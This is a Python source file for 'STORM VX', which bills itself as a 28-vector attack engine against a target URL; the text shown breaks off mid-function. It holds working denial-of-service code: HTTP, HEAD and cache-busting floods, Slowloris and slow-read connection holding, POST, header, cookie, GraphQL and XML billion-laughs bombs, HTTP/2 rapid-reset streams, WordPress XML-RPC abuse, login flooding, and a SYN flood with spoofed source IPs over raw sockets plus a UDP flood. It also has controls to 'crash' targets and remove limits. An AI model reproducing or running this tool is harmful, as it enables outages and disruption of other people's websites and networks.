#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║   STORM VX — 28-Vector Terminal Engine                                     ║
║                                                                            ║
║   3 Batches: 8 Original + 10 L7 Heavy + 10 L4/L7 New                      ║
║   Multi-process | Auto-Throttle | Smart Ramp | Green ASCII Art             ║
║                                                                            ║
║   Usage:                                                                   ║
║     python storm_vx.py https://example.com                                 ║
║                                                                            ║
║   Controls:                                                                ║
║     +      = Add 1000 workers instantly                                    ║
║     -      = Reduce step size                                              ║
║     p      = Activate 5 more attacks                                       ║
║     a      = Enable ALL 28 attacks                                         ║
║     c      = Toggle CRASH mode (unlimited ramp)                            ║
║     x      = UNLEASH! Remove ALL limits (1000% power)                      ║
║     n      = Switch to NORMAL mode (CPU 75%, RAM 60%)                       ║
║     q      = Stop and show report                                          ║
║                                                                            ║
║   WARNING: Only test your own websites!                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import sys
import signal
import random
import string
import ssl
import struct
import socket
import multiprocessing
import select
import re

try:
    import aiohttp
except ImportError:
    print("Error: pip install aiohttp"); sys.exit(1)

try:
    import tty, termios
    HAS_TERMIOS_LOCAL = True
except ImportError:
    HAS_TERMIOS_LOCAL = False

from storm_core import (
    C, AttackMode, ATTACK_NAMES, ATTACK_SHORT, ATTACK_COLORS,
    DEFAULT_ATTACKS, ATTACK_ACTIVATE_ORDER, L4_ATTACKS,
    rs, rua, rlang, rsec, rcache, fmt_bytes, fmt_bits, fmt_time,
    HF, PayloadGen, Discovery, CB, AutoThrottle, ResourceManager,
    HR, S, MODE_FIELD_MAP, LogEntry, Dashboard,
    HAS_MSVCRT, HAS_TERMIOS,
)


# ═══════════════════════════════════════════════════════════════════════════════
# ASCII ART (Green)
# ═══════════════════════════════════════════════════════════════════════════════

STORM_ASCII = r"""
{G}███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗   ██╗   ██╗██╗  ██╗{RS}
{G}██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║   ██║   ██║╚██╗██╔╝{RS}
{G}███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║   ██║   ██║ ╚███╔╝ {RS}
{G}╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║   ╚██╗ ██╔╝ ██╔██╗ {RS}
{G}███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║    ╚████╔╝ ██╔╝ ██╗{RS}
{G}╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═══╝  ╚═╝  ╚═╝{RS}
""".strip()


# ═══════════════════════════════════════════════════════════════════════════════
# Main Engine VX
# ═══════════════════════════════════════════════════════════════════════════════

class Storm:
    def __init__(self, url, step=500, step_dur=5, timeout=10):
        self.url = url
        p = url.split('//')
        self.root = p[0] + '//' + p[1].split('/')[0] if len(p) > 1 else url
        self.step = step
        self.step_dur = step_dur
        self.timeout = timeout
        self.st = S()
        self._stop = asyncio.Event()
        self._snaps = []
        self.disc = Discovery(url)
        self.cb = CB()
        self.throttle = AutoThrottle()
        self.resman = ResourceManager()
        self.dash = Dashboard()
        self._tasks = []
        # Instance variables
        self._sess = None
        self._pages = None
        self._resources = None
        self._lurl = None
        self._lf = None
        self._af = None
        self._host = None
        self._port = None
        self._ussl = None
        self._api_endpoints = None

    def stop(self):
        self._stop.set()

    def _log(self, msg, level="info", tag="SYS"):
        self.dash.add_log(msg, level, tag)

    def _rec(self, r: HR):
        self.st.total += 1
        self.st.rts.append(r.rt)
        self.st._rec.append(r)
        self.st._rtw.append(r.rt)
        self.st.bw += r.br
        self.st.bw_up += r.bs
        self.throttle.record(r)

        if r.ok:
            self.st.ok_ += 1; self.cb.suc()
        else:
            self.st.fail += 1
            if r.err:
                self.st.errs.append(r.err)
                if "Timeout" in r.err: self.st.tmo += 1
                elif "ConnErr" in r.err or "NoConnect" in r.err: self.st.conn += 1
            self.cb.fail()
        if r.code:
            self.st.codes[r.code] = self.st.codes.get(r.code, 0) + 1
            if r.code == 429: self.st.rl += 1; self.st.first_rl = self.st.first_rl or self.st.total
            elif r.code >= 500: self.st.serr += 1
        if r.hint:
            self.st.hints[r.hint] = self.st.hints.get(r.hint, 0) + 1
            h = r.hint.lower()
            if "captcha" in h: self.st.cap += 1; self.st.first_cap = self.st.first_cap or self.st.total
            elif "lock" in h: self.st.lock += 1

        # Per-mode stats
        field_name = MODE_FIELD_MAP.get(r.mode)
        if field_name:
            setattr(self.st, field_name, getattr(self.st, field_name) + 1)
        if r.mode == AttackMode.LOGIN:
            if "success" in r.hint.lower() or "redirect" in r.hint.lower():
                self.st.login_ok += 1

        sample_rate = max(1, self.st.users // 50)
        if self.st.total % sample_rate == 0 or not r.ok or r.code in (429, 502, 503):
            self.dash.add_request_log(r)

    # ─── Batch 1: Original 8 Workers ───

    async def _w_flood(self, sess, pages, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            url = random.choice(pages)
            if random.random() < 0.3:
                url += ('&' if '?' in url else '?') + rcache(); self.st.cache_b += 1
            t = time.time()
            try:
                async with sess.get(url, headers=HF.flood(url), ssl=False, allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    b = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.FLOOD, br=len(b), hint=f"{r.status}", url=url))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.FLOOD, err="Timeout", url=url))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.FLOOD, err="ConnErr", url=url))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.FLOOD, err="Err", url=url))

    async def _w_slow(self, host, port, ssl_, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            try:
                if ssl_:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=10)
                else:
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=10)
                hdr = HF.slowloris(host).encode()
                writer.write(hdr); await writer.drain()
                self._rec(HR(True, None, 0, AttackMode.SLOWLORIS, hint="SL+", bs=len(hdr)))
                while not self._stop.is_set():
                    await asyncio.sleep(random.uniform(5, 7))
                    if self._stop.is_set(): break
                    try:
                        extra = HF.sl_extra().encode()
                        writer.write(extra); await writer.drain(); self.st.bw_up += len(extra)
                    except: break
                writer.close()
                try: await writer.wait_closed()
                except: pass
            except:
                self._rec(HR(False, None, 0, AttackMode.SLOWLORIS, err="SLErr"))
                await asyncio.sleep(1)

    async def _w_spost(self, sess, url, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time()
            try:
                h = HF.flood(url); h["Content-Type"] = "application/x-www-form-urlencoded"
                h["Content-Length"] = str(random.randint(524288, 2097152))
                bd = rs(random.randint(524288, 2097152)).encode()
                async with sess.post(url, headers=h, data=bd, ssl=False, allow_redirects=False,
                                     timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    rb = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.SLOW_POST, br=len(rb), bs=len(bd), hint=f"SP{r.status}"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.SLOW_POST, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.SLOW_POST, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.SLOW_POST, err="Err"))

    async def _w_range(self, sess, resources, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            url = random.choice(resources); t = time.time()
            try:
                async with sess.get(url, headers=HF.range_(), ssl=False, allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    b = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.RANGE, br=len(b), hint=f"R{r.status}", url=url))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.RANGE, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.RANGE, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.RANGE, err="Err"))

    async def _w_login(self, sess, lurl, lf, af, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time()
            try:
                async with sess.get(lurl, headers=HF.flood(lurl), ssl=False, allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=self.timeout)) as rg:
                    html = await rg.text()
                hidden = {}
                for inp in re.findall(r'<input[^>]*type="hidden"[^>]*>', html, re.I):
                    nm = re.search(r'name="([^"]*)"', inp)
                    vl = re.search(r'value="([^"]*)"', inp)
                    if nm: hidden[nm.group(1)] = vl.group(1) if vl else ""
                fd = {**af, **hidden}
                fd[lf.get("u", "username")] = rs(random.randint(5, 12))
                fd[lf.get("p", "password")] = rs(random.randint(8, 14), string.ascii_letters + string.digits + "!@#$%")
                if lf.get("b"): fd[lf["b"]] = "Login"
                async with sess.post(lurl, headers=HF.login(lurl, self.root), data=fd, ssl=False,
                                     allow_redirects=False, timeout=aiohttp.ClientTimeout(total=self.timeout)) as rp:
                    body = await rp.text()
                    self._rec(HR(rp.status < 500, rp.status, time.time()-t, AttackMode.LOGIN, hint=self._al(rp.status, body)))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.LOGIN, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.LOGIN, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.LOGIN, err="Err"))

    async def _w_res(self, sess, resources, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            urls = random.sample(resources, min(random.randint(2, 4), len(resources)))
            for url in urls:
                if self._stop.is_set(): break
                t = time.time()
                try:
                    async with sess.get(url, headers=HF.resource(), ssl=False, allow_redirects=True,
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                        data = await r.read()
                        self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.RESOURCE, br=len(data), hint=f"RES{r.status}", url=url))
                except asyncio.TimeoutError:
                    self._rec(HR(False, None, time.time()-t, AttackMode.RESOURCE, err="Timeout"))
                except aiohttp.ClientError:
                    self._rec(HR(False, None, time.time()-t, AttackMode.RESOURCE, err="ConnErr"))
                except:
                    self._rec(HR(False, None, time.time()-t, AttackMode.RESOURCE, err="Err"))

    async def _w_pbomb(self, sess, url, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time(); bsz = random.randint(524288, 2097152)
            bd = rs(bsz).encode()
            try:
                async with sess.post(url, headers=HF.post_bomb(url, self.root, bsz), data=bd, ssl=False,
                                     allow_redirects=False, timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    rb = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.POST_BOMB, br=len(rb), bs=len(bd), hint=f"PB{r.status}"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.POST_BOMB, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.POST_BOMB, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.POST_BOMB, err="Err"))

    async def _w_ssl_flood(self, host, port, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time()
            try:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
                reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=15)
                try:
                    writer.write(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
                    await writer.drain(); await asyncio.wait_for(reader.read(100), timeout=2)
                except: pass
                writer.close()
                try: await writer.wait_closed()
                except: pass
                self._rec(HR(True, None, time.time()-t, AttackMode.SSL_FLOOD, hint="SSL+"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.SSL_FLOOD, err="Timeout"))
            except ssl.SSLError:
                self._rec(HR(False, None, time.time()-t, AttackMode.SSL_FLOOD, err="SSLErr"))
            except Exception:
                self._rec(HR(False, None, time.time()-t, AttackMode.SSL_FLOOD, err="ConnErr"))

    # ─── Batch 2: L7 Heavy Workers (10) ───

    async def _w_h2_rapid(self, host, port, pages, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time()
            try:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                ctx.set_alpn_protocols(['h2'])
                reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=10)
                ssl_obj = writer.get_extra_info('ssl_object')
                if ssl_obj and ssl_obj.selected_alpn_protocol() != 'h2':
                    writer.write(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
                    await writer.drain()
                    try: await asyncio.wait_for(reader.read(100), timeout=2)
                    except: pass
                    writer.close()
                    try: await writer.wait_closed()
                    except: pass
                    self._rec(HR(True, None, time.time()-t, AttackMode.H2_RAPID, hint="H2-1.1")); continue
                preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
                settings = b'\x00\x00\x00\x04\x00\x00\x00\x00\x00'
                writer.write(preface + settings); await writer.drain()
                for stream_id in range(1, min(200, 100000), 2):
                    path = random.choice(pages).split(host)[-1] if host in random.choice(pages) else "/"
                    if len(path) > 50: path = path[:50]
                    hdr_payload = f":method: GET\n:path: {path}\n:authority: {host}\n:scheme: https\nuser-agent: {rua()}\n".encode()
                    hdr_frame = struct.pack('>I', len(hdr_payload))[1:] + b'\x01' + struct.pack('>I', stream_id)[1:] + hdr_payload
                    rst_frame = struct.pack('>I', 4)[1:] + b'\x03' + struct.pack('>I', stream_id)[1:] + b'\x00\x00\x00\x08'
                    writer.write(hdr_frame + rst_frame)
                    if stream_id % 50 == 0: await writer.drain()
                await writer.drain(); writer.close()
                try: await writer.wait_closed()
                except: pass
                self._rec(HR(True, None, time.time()-t, AttackMode.H2_RAPID, hint="H2RR+"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.H2_RAPID, err="Timeout"))
            except Exception:
                self._rec(HR(False, None, time.time()-t, AttackMode.H2_RAPID, err="ConnErr"))

    async def _w_ws_flood(self, host, port, ssl_, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time()
            try:
                scheme = 'wss' if ssl_ else 'ws'
                ws_paths = ["/ws", "/socket.io/?EIO=4&transport=websocket", "/live", "/chat/ws", "/stream"]
                url = f"{scheme}://{host}:{port}{random.choice(ws_paths)}"
                async with aiohttp.ClientSession() as ws_sess:
                    async with ws_sess.ws_connect(url, ssl=False, timeout=aiohttp.ClientTimeout(total=self.timeout)) as ws:
                        self._rec(HR(True, None, time.time()-t, AttackMode.WS_FLOOD, hint="WS+"))
                        for _ in range(random.randint(10, 50)):
                            if self._stop.is_set(): break
                            msg = rs(random.randint(50, 500)); await ws.send_str(msg); self.st.bw_up += len(msg)
                            await asyncio.sleep(random.uniform(0.01, 0.1))
                        await ws.close()
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.WS_FLOOD, err="Timeout"))
            except Exception:
                self._rec(HR(False, None, time.time()-t, AttackMode.WS_FLOOD, err="WSErr"))
                await asyncio.sleep(1)

    async def _w_wp_xmlrpc(self, sess, url, root, d=0):
        if d > 0: await asyncio.sleep(d)
        xmlrpc_url = root + "/xmlrpc.php"
        while not self._stop.is_set():
            t = time.time()
            try:
                payload = PayloadGen.wp_xmlrpc_methods().encode()
                async with sess.post(xmlrpc_url, headers=HF.wp_xmlrpc(xmlrpc_url, root), data=payload, ssl=False,
                                     allow_redirects=False, timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    rb = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.WP_XMLRPC, br=len(rb), bs=len(payload), hint=f"WP{r.status}"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.WP_XMLRPC, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.WP_XMLRPC, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.WP_XMLRPC, err="Err"))

    async def _w_cache_storm(self, sess, pages, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            url = PayloadGen.cache_bust_url(random.choice(pages)); self.st.cache_b += 1
            t = time.time()
            try:
                async with sess.get(url, headers=HF.cache_storm(url), ssl=False, allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    b = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.CACHE_STORM, br=len(b), hint=f"CB{r.status}", url=url))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.CACHE_STORM, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.CACHE_STORM, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.CACHE_STORM, err="Err"))

    async def _w_api_fuzz(self, sess, url, root, api_endpoints, d=0):
        if d > 0: await asyncio.sleep(d)
        targets = api_endpoints if api_endpoints else [root + "/api/", root + "/api/v1/"]
        while not self._stop.is_set():
            target = random.choice(targets); t = time.time()
            try:
                payload = PayloadGen.api_fuzz_json().encode()
                async with sess.post(target, headers=HF.api_fuzz(target, root), data=payload, ssl=False,
                                     allow_redirects=False, timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    rb = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.API_FUZZ, br=len(rb), bs=len(payload), hint=f"API{r.status}"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.API_FUZZ, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.API_FUZZ, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.API_FUZZ, err="Err"))

    async def _w_multipart(self, sess, url, root, d=0):
        if d > 0: await asyncio.sleep(d)
        targets = [url, root + "/upload", root + "/api/upload", root + "/wp-admin/upload.php"]
        while not self._stop.is_set():
            target = random.choice(targets); t = time.time()
            try:
                boundary = f"----StormBoundary{rs(16)}"
                payload = PayloadGen.multipart_body(boundary)
                async with sess.post(target, headers=HF.multipart(target, root, boundary), data=payload, ssl=False,
                                     allow_redirects=False, timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    rb = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.MULTIPART, br=len(rb), bs=len(payload), hint=f"MP{r.status}"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.MULTIPART, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.MULTIPART, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.MULTIPART, err="Err"))

    async def _w_header_bomb(self, sess, pages, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            url = random.choice(pages); t = time.time()
            try:
                async with sess.get(url, headers=HF.header_bomb(), ssl=False, allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    b = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.HEADER_BOMB, br=len(b), hint=f"HB{r.status}", url=url))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.HEADER_BOMB, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.HEADER_BOMB, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.HEADER_BOMB, err="Err"))

    async def _w_chunked(self, host, port, ssl_, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time()
            try:
                if ssl_:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=10)
                else:
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=10)
                writer.write(HF.chunked(host).encode()); await writer.drain()
                for _ in range(random.randint(20, 80)):
                    if self._stop.is_set(): break
                    chunk_data = rs(random.randint(1, 10)).encode()
                    writer.write(f"{len(chunk_data):x}\r\n".encode() + chunk_data + b"\r\n")
                    await writer.drain(); await asyncio.sleep(random.uniform(0.05, 0.3))
                writer.write(b"0\r\n\r\n"); await writer.drain()
                try: await asyncio.wait_for(reader.read(1024), timeout=3)
                except: pass
                writer.close()
                try: await writer.wait_closed()
                except: pass
                self._rec(HR(True, None, time.time()-t, AttackMode.CHUNKED, hint="CHK+"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.CHUNKED, err="Timeout"))
            except Exception:
                self._rec(HR(False, None, time.time()-t, AttackMode.CHUNKED, err="ConnErr"))

    async def _w_session_flood(self, sess, pages, d=0):
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            url = random.choice(pages); t = time.time()
            try:
                headers = HF.session_flood(url, self.root)
                headers["Cookie"] += f"; JSESSIONID={rs(32)}; ASP.NET_SessionId={rs(24)}; _session_id={rs(36)}; token={rs(20)}"
                async with sess.get(url, headers=headers, ssl=False, allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    b = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.SESSION_FLOOD, br=len(b), hint=f"SF{r.status}"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.SESSION_FLOOD, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.SESSION_FLOOD, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.SESSION_FLOOD, err="Err"))

    async def _w_gql_bomb(self, sess, url, root, d=0):
        if d > 0: await asyncio.sleep(d)
        gql_endpoints = [root + "/graphql", root + "/api/graphql", root + "/gql", url]
        while not self._stop.is_set():
            target = random.choice(gql_endpoints); t = time.time()
            try:
                payload = PayloadGen.gql_deep_query().encode()
                async with sess.post(target, headers=HF.gql_bomb(target, root), data=payload, ssl=False,
                                     allow_redirects=False, timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    rb = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.GQL_BOMB, br=len(rb), bs=len(payload), hint=f"GQL{r.status}"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.GQL_BOMB, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.GQL_BOMB, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.GQL_BOMB, err="Err"))

    # ─── Batch 3: New 10 L4/L7 Workers ───

    async def _w_syn_flood(self, host, port, d=0):
        """L4: SYN Flood — send raw SYN packets (requires root)."""
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time()
            try:
                # Build raw SYN packet
                src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                dst_ip = socket.gethostbyname(host)
                src_port = random.randint(1024, 65535)
                dst_port = port
                # IP header
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    0x45, 0, 40, random.randint(0, 65535), 0x4000, 64, 6, 0,
                    socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
                # TCP header (SYN)
                tcp_seq = random.randint(0, 0xFFFFFFFF)
                tcp_header = struct.pack('!HHIIBBHHH',
                    src_port, dst_port, tcp_seq, 0,
                    (5 << 4), 0x02, 8192, 0, 0)
                # Send via raw socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.setblocking(False)
                packet = ip_header + tcp_header
                await asyncio.get_event_loop().sock_sendto(sock, packet, (dst_ip, dst_port))
                sock.close()
                self._rec(HR(True, None, time.time()-t, AttackMode.SYN_FLOOD, hint="SYN+", bs=len(packet)))
            except PermissionError:
                self._rec(HR(False, None, time.time()-t, AttackMode.SYN_FLOOD, err="NeedRoot"))
                await asyncio.sleep(5)
            except Exception:
                self._rec(HR(False, None, time.time()-t, AttackMode.SYN_FLOOD, err="Err"))

    async def _w_udp_flood(self, host, port, d=0):
        """L4: UDP Flood — bombard with random UDP packets (requires root)."""
        if d > 0: await asyncio.sleep(d)
        dst_ip = None
        while not self._stop.is_set():
            t = time.time()
            try:
                if dst_ip is None:
                    dst_ip = socket.gethostbyname(host)
                payload = rs(random.randint(64, 1024)).encode()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setblocking(False)
                dst_port = random.choice([port, 53, 80, 443, 8080, random.randint(1, 65535)])
                await asyncio.get_event_loop().sock_sendto(sock, payload, (dst_ip, dst_port))
                sock.close()
                self._rec(HR(True, None, time.time()-t, AttackMode.UDP_FLOOD, hint="UDP+", bs=len(payload)))
            except PermissionError:
                self._rec(HR(False, None, time.time()-t, AttackMode.UDP_FLOOD, err="NeedRoot"))
                await asyncio.sleep(5)
            except Exception:
                self._rec(HR(False, None, time.time()-t, AttackMode.UDP_FLOOD, err="Err"))

    async def _w_cookie_bomb(self, sess, pages, d=0):
        """L7: Cookie Bomb — massive cookies (8KB+) to exhaust header parsing."""
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            url = random.choice(pages); t = time.time()
            try:
                headers = HF.cookie_bomb(url, self.root)
                async with sess.get(url, headers=headers, ssl=False, allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    b = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.COOKIE_BOMB, br=len(b), hint=f"CK{r.status}"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.COOKIE_BOMB, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.COOKIE_BOMB, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.COOKIE_BOMB, err="Err"))

    async def _w_head_flood(self, sess, pages, d=0):
        """L7: HTTP HEAD Flood — CPU-intensive header-only requests."""
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            url = random.choice(pages)
            if random.random() < 0.3:
                url += ('&' if '?' in url else '?') + rcache(); self.st.cache_b += 1
            t = time.time()
            try:
                async with sess.head(url, headers=HF.head_flood(url), ssl=False, allow_redirects=True,
                                     timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    b = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.HEAD_FLOOD, br=len(b), hint=f"HD{r.status}", url=url))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.HEAD_FLOOD, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.HEAD_FLOOD, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.HEAD_FLOOD, err="Err"))

    async def _w_xml_bomb(self, sess, url, root, d=0):
        """L7: XML Bomb (Billion Laughs) — entity expansion OOM attack."""
        if d > 0: await asyncio.sleep(d)
        targets = [url, root + "/api/xml", root + "/soap", root + "/webservice", root + "/ws",
                   root + "/api/soap", root + "/xmlrpc.php"]
        while not self._stop.is_set():
            target = random.choice(targets); t = time.time()
            try:
                payload = PayloadGen.xml_bomb_payload().encode()
                async with sess.post(target, headers=HF.xml_bomb(target, root), data=payload, ssl=False,
                                     allow_redirects=False, timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    rb = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.XML_BOMB, br=len(rb), bs=len(payload), hint=f"XML{r.status}"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.XML_BOMB, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.XML_BOMB, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.XML_BOMB, err="Err"))

    async def _w_slow_read(self, host, port, ssl_, pages, d=0):
        """L7: Slow Read — read response very slowly to hold connections."""
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time()
            try:
                if ssl_:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=10)
                else:
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=10)
                path = random.choice(pages).split(host)[-1] if host in random.choice(pages) else "/"
                if len(path) > 50: path = path[:50]
                request = HF.slow_read(host, path).encode()
                writer.write(request); await writer.drain()
                self._rec(HR(True, None, 0, AttackMode.SLOW_READ, hint="SR+", bs=len(request)))
                # Read response byte by byte very slowly
                total_read = 0
                for _ in range(random.randint(30, 100)):
                    if self._stop.is_set(): break
